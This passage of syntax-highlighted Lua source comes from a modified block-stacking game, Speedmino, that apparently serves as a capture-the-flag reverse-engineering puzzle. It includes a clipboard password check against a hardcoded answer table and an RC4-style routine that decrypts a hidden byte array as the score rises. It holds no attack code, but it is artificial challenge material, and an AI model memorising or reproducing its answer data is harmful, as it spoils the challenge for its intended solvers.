class="keyword">then</span></span><br><span class="line">            lastSpikeTime = <span class="built_in">time</span></span><br><span class="line">            lastSpikeEndTime = <span class="built_in">time</span> + <span class="number">2.6</span></span><br><span class="line">            lastAttack = attack</span><br><span class="line">            lastAttackTime = <span class="built_in">time</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> spin <span class="keyword">then</span> </span><br><span class="line">            SFX.play(<span class="string">&#x27;spin_0&#x27;</span>) </span><br><span class="line">            b2b = b2b + <span class="number">1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        combo = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    popNext()</span><br><span class="line">    SFX.play(<span class="string">&#x27;lock&#x27;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">newGame</span><span class="params">()</span></span></span><br><span class="line">    <span class="built_in">collectgarbage</span>(<span class="string">&quot;collect&quot;</span>)</span><br><span class="line">    field=TABLE.newMat(<span class="literal">false</span>, <span class="number">40</span>, <span class="number">10</span>)</span><br><span class="line">    nextQueue,holdSlot=&#123;&#125;,<span class="literal">false</span></span><br><span class="line">    moveDir,moveCharge=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    supplyNext()</span><br><span class="line">    popNext()</span><br><span class="line">    keyState=&#123;</span><br><span class="line">        moveLeft=<span class="literal">false</span>,</span><br><span class="line">        moveRight=<span class="literal">false</span>,</span><br><span class="line">        rotateCW=<span class="literal">false</span>,</span><br><span class="line">        rotateCCW=<span class="literal">false</span>,</span><br><span class="line">        rotate180=<span class="literal">false</span>,</span><br><span class="line">        hold=<span class="literal">false</span>,</span><br><span class="line">        softDrop=<span class="literal">false</span>,</span><br><span class="line">        hardDrop=<span class="literal">false</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">time</span>,line=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    b2b,combo=<span class="number">-1</span>,<span class="number">-1</span></span><br><span class="line">    speedcombo = <span class="number">0</span></span><br><span class="line">    speedcombotime = <span class="number">0</span></span><br><span class="line">    playing=<span class="literal">true</span></span><br><span class="line">    scoreBuffer = <span class="number">0</span></span><br><span class="line">    score = <span class="number">0</span></span><br><span class="line">    multi = <span class="number">1</span></span><br><span class="line">    multiGauge = <span class="number">0</span></span><br><span class="line">    lastSpike = <span class="number">0</span></span><br><span class="line">    lastAttack = <span class="number">0</span></span><br><span class="line">    lastAttackTime = <span class="number">-1</span></span><br><span class="line">    lastSpikeTime = <span class="number">0</span></span><br><span class="line">    lastSpikeEndTime = <span class="number">0</span></span><br><span class="line">    secretBox = KSA()</span><br><span class="line">    secret_i = <span class="number">0</span></span><br><span class="line">    secret_j = <span class="number">0</span></span><br><span class="line">    youwillget = &#123;<span class="number">187</span>,<span class="number">24</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">58</span>,<span class="number">243</span>,<span class="number">176</span>,<span class="number">235</span>,<span class="number">179</span>,<span class="number">159</span>,<span class="number">170</span>,<span class="number">155</span>,<span class="number">201</span>,<span class="number">23</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">210</span>,<span class="number">27</span>,<span class="number">113</span>,<span class="number">11</span>,<span class="number">161</span>,<span class="number">94</span>,<span class="number">245</span>,<span class="number">41</span>,<span class="number">29</span>,<span class="number">43</span>,<span class="number">199</span>,<span class="number">8</span>,<span class="number">200</span>,<span class="number">252</span>,<span class="number">86</span>,<span class="number">17</span>,<span class="number">72</span>,<span class="number">177</span>,<span class="number">52</span>,<span class="number">252</span>,<span class="number">20</span>,<span class="number">74</span>,<span class="number">111</span>,<span class="number">53</span>,<span class="number">28</span>,<span class="number">6</span>,<span class="number">190</span>,<span class="number">108</span>,<span class="number">47</span>,<span class="number">16</span>,<span class="number">237</span>,<span class="number">148</span>,<span class="number">82</span>,<span class="number">253</span>,<span class="number">148</span>,<span class="number">6</span>&#125;</span><br><span class="line">    youwillget[<span class="number">0</span>] = #youwillget</span><br><span class="line">    trymore = <span class="number">0</span></span><br><span class="line">    scoremore = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> pass = CLIPBOARD.get()</span><br><span class="line">    <span class="keyword">if</span> #pass &gt; <span class="number">0</span> <span class="keyword">and</span> #pass &lt;= <span class="number">55</span> <span class="keyword">then</span></span><br><span class="line">        <span class="comment">-- MSG(&#x27;info&#x27;, pass)</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pass = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    pass = pass .. <span class="built_in">string</span>.<span class="built_in">rep</span>(<span class="string">&quot; &quot;</span>,<span class="number">55</span> - <span class="built_in">string</span>.<span class="built_in">len</span>(pass))</span><br><span class="line">    <span class="keyword">local</span> passTable = &#123;&#125;</span><br><span class="line">    passTable[<span class="number">0</span>] = #pass</span><br><span class="line">    <span class="keyword">for</span> n = <span class="number">1</span>, #pass <span class="keyword">do</span></span><br><span class="line">        passTable[n] = <span class="built_in">string</span>.<span class="built_in">byte</span>(pass, n,n)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> result_table = calcData(passTable)</span><br><span class="line">    SFX.play(<span class="string">&#x27;start&#x27;</span>)</span><br><span class="line">    <span class="keyword">local</span> verfiy = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">local</span> answer_table = &#123;<span class="number">222</span>,<span class="number">174</span>,<span class="number">208</span>,<span class="number">225</span>,<span class="number">137</span>,<span class="number">95</span>,<span class="number">76</span>,<span class="number">120</span>,<span class="number">104</span>,<span class="number">84</span>,<span class="number">161</span>,<span class="number">74</span>,<span class="number">222</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">91</span>,<span class="number">249</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">126</span>,<span class="number">69</span>,<span class="number">81</span>,<span class="number">231</span>,<span class="number">170</span>,<span class="number">178</span>,<span class="number">8</span>,<span class="number">164</span>,<span class="number">164</span>,<span class="number">169</span>,<span class="number">2</span>,<span class="number">191</span>,<span class="number">138</span>,<span class="number">156</span>,<span class="number">165</span>,<span class="number">185</span>,<span class="number">42</span>,<span class="number">75</span>,<span class="number">23</span>,<span class="number">89</span>,<span class="number">160</span>,<span class="number">5</span>,<span class="number">134</span>,<span class="number">82</span>,<span class="number">78</span>,<span class="number">10</span>,<span class="number">120</span>,<span class="number">108</span>,<span class="number">98</span>,<span class="number">114</span>,<span class="number">159</span>,<span class="number">59</span>,<span class="number">243</span>,<span class="number">87</span>,<span class="number">214</span>,<span class="number">243</span>,&#125;    </span><br><span class="line">    <span class="keyword">for</span> n = <span class="number">1</span>, #pass <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> result_table[n] ~= answer_table[n] <span class="keyword">then</span></span><br><span class="line">            verfiy = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> verfiy <span class="keyword">then</span></span><br><span class="line">        MSG(<span class="string">&#x27;warn&#x27;</span>,<span class="string">&quot;Maybe you are right or not?&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> actions=&#123;</span><br><span class="line">    moveLeft=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        <span class="keyword">if</span> testPos(hand, handX<span class="number">-1</span>, handY) <span class="keyword">then</span></span><br><span class="line">            handX=handX<span class="number">-1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        moveDir=<span class="number">-1</span></span><br><span class="line">        moveCharge=<span class="number">0</span></span><br><span class="line">        freshGhost()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">teleLeft=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        <span class="keyword">while</span> testPos(hand, handX<span class="number">-1</span>, handY) <span class="keyword">do</span></span><br><span class="line">            handX=handX<span class="number">-1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        moveCharge=<span class="number">0</span></span><br><span class="line">        freshGhost()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    moveRight=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        <span class="keyword">if</span> testPos(hand, handX+<span class="number">1</span>, handY) <span class="keyword">then</span></span><br><span class="line">            handX=handX+<span class="number">1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        moveDir=<span class="number">1</span></span><br><span class="line">        moveCharge=<span class="number">0</span></span><br><span class="line">        freshGhost()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">teleRight=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        <span class="keyword">while</span> testPos(hand, handX+<span class="number">1</span>, handY) <span class="keyword">do</span></span><br><span class="line">            handX=handX+<span class="number">1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        moveCharge=<span class="number">0</span></span><br><span class="line">        freshGhost()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    rotateCW=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        rotate(<span class="string">&#x27;R&#x27;</span>)</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    rotateCCW=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        rotate(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    rotate180=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        rotate(<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    hold=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        <span class="keyword">local</span> id=hand.id</span><br><span class="line">        hand=TABLE.copy(pieceList[hand.id])</span><br><span class="line">        hand.id=id</span><br><span class="line">        <span class="keyword">if</span> holdSlot <span class="keyword">then</span></span><br><span class="line">            hand,holdSlot=holdSlot,hand</span><br><span class="line">            freshPiecePos()</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            holdSlot=hand</span><br><span class="line">            popNext()</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    softDrop=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        handY=ghostY</span><br><span class="line">        freshGhost()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    hardDrop=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        dropPiece()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">local</span> actionsRel=&#123;</span><br><span class="line">    moveLeft=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        moveDir=keyState.moveRight <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">or</span> <span class="number">0</span></span><br><span class="line">        moveCharge=<span class="number">0</span></span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    moveRight=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        moveDir=keyState.moveLeft <span class="keyword">and</span> <span class="number">-1</span> <span class="keyword">or</span> <span class="number">0</span></span><br><span class="line">        moveCharge=<span class="number">0</span></span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">---@type Zenitha.Scene</span></span><br><span class="line"><span class="keyword">local</span> scene=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scene.load</span><span class="params">()</span></span></span><br><span class="line">    newGame()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scene.keyDown</span><span class="params">(key)</span></span></span><br><span class="line">    <span class="keyword">if</span> bindingKey <span class="keyword">then</span></span><br><span class="line">        keyConf[bindingKey]=key</span><br><span class="line">        bindingKey=bindingKey+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> bindingKey&gt;<span class="number">8</span> <span class="keyword">then</span></span><br><span class="line">            bindingKey=<span class="literal">false</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> key==<span class="string">&#x27;tab&#x27;</span> <span class="keyword">then</span></span><br><span class="line">            bindingKey=<span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> sysKey[key] <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> sysKey[key]==<span class="string">&#x27;restart&#x27;</span> <span class="keyword">then</span></span><br><span class="line">                newGame()</span><br><span class="line">            <span class="keyword">elseif</span> sysKey[key]==<span class="string">&#x27;das-&#x27;</span> <span class="keyword">then</span></span><br><span class="line">                das=<span class="built_in">math</span>.<span class="built_in">max</span>(<span class="number">1</span>, das<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">elseif</span> sysKey[key]==<span class="string">&#x27;das+&#x27;</span> <span class="keyword">then</span></span><br><span class="line">                das=das+<span class="number">1</span></span><br><span class="line">            <span class="keyword">elseif</span> sysKey[key]==<span class="string">&#x27;arr-&#x27;</span> <span class="keyword">then</span></span><br><span class="line">                arr=<span class="built_in">math</span>.<span class="built_in">max</span>(<span class="number">0</span>, arr<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">elseif</span> sysKey[key]==<span class="string">&#x27;arr+&#x27;</span> <span class="keyword">then</span></span><br><span class="line">                arr=arr+<span class="number">1</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> playing <span class="keyword">then</span> <span class="keyword">return</span> <span class="literal">true</span> <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> action=actionList[TABLE.<span class="built_in">find</span>(keyConf, key)]</span><br><span class="line">        <span class="keyword">if</span> action <span class="keyword">then</span></span><br><span class="line">            keyState[action]=<span class="literal">true</span></span><br><span class="line">            (actions[action] <span class="keyword">or</span> NULL)()</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scene.keyUp</span><span class="params">(key)</span></span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> playing <span class="keyword">then</span> <span class="keyword">return</span> <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> action=actionList[TABLE.<span class="built_in">find</span>(keyConf, key)]</span><br><span class="line">    <span class="keyword">if</span> action <span class="keyword">then</span></span><br><span class="line">        keyState[action]=<span class="literal">false</span></span><br><span class="line">        (actionsRel[action] <span class="keyword">or</span> NULL)()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scene.update</span><span class="params">(dt)</span></span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> playing <span class="keyword">then</span> <span class="keyword">return</span> <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">time</span>=<span class="built_in">time</span>+dt</span><br><span class="line">    multiGauge = multiGauge - <span class="number">1</span> * (multi ^ <span class="number">2</span> + multi) * dt / <span class="number">60</span></span><br><span class="line">    <span class="keyword">if</span> multiGauge &lt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> multi &gt;= <span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">            multi = multi - <span class="number">1</span></span><br><span class="line">            multiGauge = multiGauge + multi * <span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            multiGauge = <span class="number">0</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    scoreBuffer = scoreBuffer + multi * dt * <span class="number">1</span> * <span class="number">0.25</span></span><br><span class="line">    <span class="keyword">if</span> speedcombotime &lt; <span class="built_in">time</span> <span class="keyword">then</span></span><br><span class="line">        lastSpikeEndTime = lastSpikeEndTime - <span class="number">1</span> * dt</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">time</span> &gt; lastSpikeEndTime <span class="keyword">then</span></span><br><span class="line">        lastSpike = <span class="number">0</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> scoreAdd = <span class="built_in">math</span>.<span class="built_in">min</span>(scoreBuffer / <span class="number">30</span>,<span class="number">1.000</span>)</span><br><span class="line">    score = score + scoreAdd</span><br><span class="line">    scoreBuffer = scoreBuffer - scoreAdd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> trymore &lt; <span class="number">2600</span> <span class="keyword">and</span> score &gt;= (scoremore + <span class="number">1</span> * <span class="number">1</span>) <span class="keyword">then</span></span><br><span class="line">        trymore = trymore + <span class="number">1</span></span><br><span class="line">        scoremore = <span class="built_in">math</span>.<span class="built_in">floor</span>(score)</span><br><span class="line">        youwillget = calcData(youwillget)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> moveDir~=<span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        moveCharge=moveCharge+<span class="number">1</span></span><br><span class="line">        <span class="keyword">local</span> chrg=moveCharge</span><br><span class="line">        <span class="keyword">if</span> arr==<span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> moveCharge&gt;=das <span class="keyword">then</span></span><br><span class="line">                (actions[moveDir==<span class="number">1</span> <span class="keyword">and</span> <span class="string">&#x27;teleRight&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;teleLeft&#x27;</span>] <span class="keyword">or</span> NULL)()</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">if</span> moveCharge&gt;=das <span class="keyword">and</span> (moveCharge-das)%arr==<span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">                (actions[moveDir==<span class="number">1</span> <span class="keyword">and</span> <span class="string">&#x27;moveRight&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;moveLeft&#x27;</span>] <span class="keyword">or</span> NULL)()</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        moveCharge=chrg</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> keyState.softDrop <span class="keyword">then</span></span><br><span class="line">        handY=ghostY</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> handY&gt;ghostY <span class="keyword">then</span></span><br><span class="line">        dropTimer=dropTimer<span class="number">-1</span></span><br><span class="line">        <span class="keyword">if</span> dropTimer&lt;=<span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            handY=handY<span class="number">-1</span></span><br><span class="line">            dropTimer=dropDelay</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        lockTimer=lockTimer<span class="number">-1</span></span><br><span class="line">        <span class="keyword">if</span> lockTimer&lt;=<span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            dropPiece()</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> gc=love.graphics</span><br><span class="line"><span class="keyword">local</span> gc_translate=gc.translate</span><br><span class="line"><span class="keyword">local</span> gc_setColor,gc_setLineWidth=gc.setColor,gc.setLineWidth</span><br><span class="line"><span class="keyword">local</span> gc_mRect, gc_mDraw, gc_mDrawQ, gc_strokeDraw = GC.mRect, GC.mDraw, GC.mDrawQ, GC.strokeDraw</span><br><span class="line"><span class="keyword">local</span> gc_draw = gc.draw</span><br><span class="line"><span class="keyword">local</span> gc_blurCircle, gc_strokePrint = GC.blurCircle, GC.strokePrint</span><br><span class="line"><span class="keyword">local</span> gc_rectangle=gc.rectangle</span><br><span class="line"><span class="keyword">local</span> gc_print=gc.<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> height_text = GC.newText(FONT.get(<span class="number">30</span>))</span><br><span class="line"><span class="keyword">local</span> number_text = GC.newText(FONT.get(<span class="number">30</span>))</span><br><span class="line"><span class="keyword">local</span> chargeIcon = GC.<span class="built_in">load</span> &#123;</span><br><span class="line">    w = <span class="number">512</span>, h = <span class="number">512</span>,</span><br><span class="line">    &#123; <span class="string">&#x27;move&#x27;</span>,   <span class="number">256</span>,  <span class="number">256</span> &#125;,</span><br><span class="line">    &#123; <span class="string">&#x27;fCirc&#x27;</span>,  <span class="number">0</span>,    <span class="number">0</span>,  <span class="number">180</span>, <span class="number">4</span> &#125;,</span><br><span class="line">    &#123; <span class="string">&#x27;rotate&#x27;</span>, <span class="number">.5236</span> &#125;,</span><br><span class="line">    &#123; <span class="string">&#x27;fCirc&#x27;</span>,  <span class="number">0</span>,    <span class="number">0</span>,  <span class="number">180</span>, <span class="number">4</span> &#125;,</span><br><span class="line">    &#123; <span class="string">&#x27;rotate&#x27;</span>, <span class="number">.5236</span> &#125;,</span><br><span class="line">    &#123; <span class="string">&#x27;fCirc&#x27;</span>,  <span class="number">0</span>,    <span class="number">0</span>,  <span class="number">180</span>, <span class="number">4</span> &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scene.draw</span><span class="params">()</span></span></span><br><span class="line">    <span class="comment">-- Texts</span></span><br><span class="line">    gc_setColor(COLOR.L)</span><br><span class="line">    FONT.set(<span class="number">20</span>)</span><br><span class="line">    gc_print(<span class="string">&#x27;Speedmino Created By MrZ and modified by zxc&#x27;</span>, <span class="number">10</span>, <span class="number">0</span>)</span><br><span class="line">    gc_print(<span class="string">&#x27;DAS    &#x27;</span>..das, <span class="number">10</span>, <span class="number">30</span>)</span><br><span class="line">    gc_print(<span class="string">&#x27;ARR    &#x27;</span>..arr, <span class="number">10</span>, <span class="number">50</span>)</span><br><span class="line">    gc_print(<span class="string">&#x27;Press - + [ ] to set DAS/ARR&#x27;</span>, <span class="number">10</span>, <span class="number">80</span>)</span><br><span class="line">    <span class="keyword">if</span> bindingKey <span class="keyword">then</span></span><br><span class="line">        gc_setColor(love.timer.getTime()%<span class="number">.26</span>&lt;<span class="number">.126</span> <span class="keyword">and</span> COLOR.L <span class="keyword">or</span> COLOR.Y)</span><br><span class="line">        gc_setLineWidth(<span class="number">1</span>)</span><br><span class="line">        gc_rectangle(<span class="string">&#x27;line&#x27;</span>, <span class="number">5</span>, <span class="number">124</span>+<span class="number">20</span>*bindingKey, <span class="number">226</span>, <span class="number">20</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">1</span>,#actionList <span class="keyword">do</span></span><br><span class="line">        gc_print(actionList[i], <span class="number">10</span>, <span class="number">120</span>+<span class="number">20</span>*i)</span><br><span class="line">        gc_print(keyConf[i], <span class="number">150</span>, <span class="number">120</span>+<span class="number">20</span>*i)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    gc_print(<span class="string">&#x27;Press Tab to rebind keys&#x27;</span>, <span class="number">10</span>, <span class="number">310</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- Background Text </span></span><br><span class="line">    gc_setColor(<span class="number">0.15</span>,<span class="number">0.15</span>,<span class="number">0.15</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> trymore &gt;= <span class="number">2600</span> <span class="keyword">then</span></span><br><span class="line">        gc_setColor(COLOR.Orange)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    FONT.set(<span class="number">40</span>)</span><br><span class="line">    gc_print(tableToStr(youwillget), <span class="number">30</span>, <span class="number">400</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> playing <span class="keyword">then</span> </span><br><span class="line">        gc_setColor(COLOR.DarkLight)</span><br><span class="line">        gc_print(<span class="string">&quot;PRESS R TO TRY AGAIN&quot;</span>, <span class="number">450</span>, <span class="number">500</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    gc_translate(<span class="number">475</span>, <span class="number">850</span>)</span><br><span class="line">    gc_setLineWidth(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- Time</span></span><br><span class="line">    gc_setColor(COLOR.L)</span><br><span class="line">    FONT.set(<span class="number">30</span>)</span><br><span class="line">    gc_print(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&#x27;%.3f&#x27;</span>, <span class="built_in">time</span>), <span class="number">-160</span>, <span class="number">-40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- Multi</span></span><br><span class="line">    gc_setColor(multiColorTable[(multi<span class="number">-1</span>) % #multiColorTable])</span><br><span class="line">    gc_rectangle(<span class="string">&#x27;line&#x27;</span>, <span class="number">-4</span>, <span class="number">48</span>, <span class="number">408</span>, <span class="number">-32</span>)</span><br><span class="line">    FONT.set(<span class="number">30</span>)</span><br><span class="line">    gc_print(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&#x27;x%d&#x27;</span>, multi), <span class="number">412</span>, <span class="number">16</span>)</span><br><span class="line">    gc_rectangle(<span class="string">&#x27;fill&#x27;</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">396</span>, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">local</span> multiProgress = multiGauge / (multi * <span class="number">3</span>)</span><br><span class="line">    gc_setColor(multiColorTable[(multi) % #multiColorTable])</span><br><span class="line">    gc_rectangle(<span class="string">&#x27;fill&#x27;</span>, <span class="number">0</span>, <span class="number">24</span>, multiProgress * <span class="number">396</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- Score</span></span><br><span class="line">    gc_setColor(COLOR.L)</span><br><span class="line">    FONT.set(<span class="number">30</span>)</span><br><span class="line">    </span><br><span class="line">    height_text:set((<span class="string">&quot;%.2f&quot;</span>):<span class="built_in">format</span>(score))</span><br><span class="line">    <span class="keyword">local</span> wid, hgt = height_text:getDimensions()</span><br><span class="line">    gc_strokeDraw(<span class="string">&#x27;corner&#x27;</span>, <span class="number">1</span>, height_text, <span class="number">200</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">0.8</span>, <span class="number">0.8</span>, wid / <span class="number">2</span>, hgt / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> playing <span class="keyword">then</span></span><br><span class="line">        <span class="comment">-- Board</span></span><br><span class="line">        gc_setColor(COLOR.dL)</span><br><span class="line"></span><br><span class="line">        gc_rectangle(<span class="string">&quot;line&quot;</span>, <span class="number">-4</span>, <span class="number">4</span>, <span class="number">408</span>, <span class="number">-808</span>)</span><br><span class="line">        <span class="comment">-- Field</span></span><br><span class="line">        <span class="keyword">for</span> y=<span class="number">1</span>,<span class="number">40</span> <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">for</span> x=<span class="number">1</span>,<span class="number">10</span> <span class="keyword">do</span></span><br><span class="line">                <span class="keyword">if</span> field[y][x] <span class="keyword">then</span></span><br><span class="line">                    gc_setColor(colors[field[y][x]])</span><br><span class="line">                    gc_rectangle(<span class="string">&#x27;fill&#x27;</span>, (x<span class="number">-1</span>)*<span class="number">40</span>, -(y)*<span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>)</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">-- Ghost</span></span><br><span class="line">        gc_setColor(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">.26</span>)</span><br><span class="line">        <span class="keyword">for</span> y=<span class="number">1</span>,#hand <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">for</span> x=<span class="number">1</span>,#hand[<span class="number">1</span>] <span class="keyword">do</span></span><br><span class="line">                <span class="keyword">if</span> hand[y][x] <span class="keyword">then</span></span><br><span class="line">                    gc_rectangle(<span class="string">&#x27;fill&#x27;</span>, (handX+x<span class="number">-2</span>)*<span class="number">40</span>, -(ghostY+y<span class="number">-1</span>)*<span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>)</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">-- Hand Outline</span></span><br><span class="line">        gc_setColor(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, (lockTimer/lockDelay)^<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span> y=<span class="number">1</span>,#hand <span 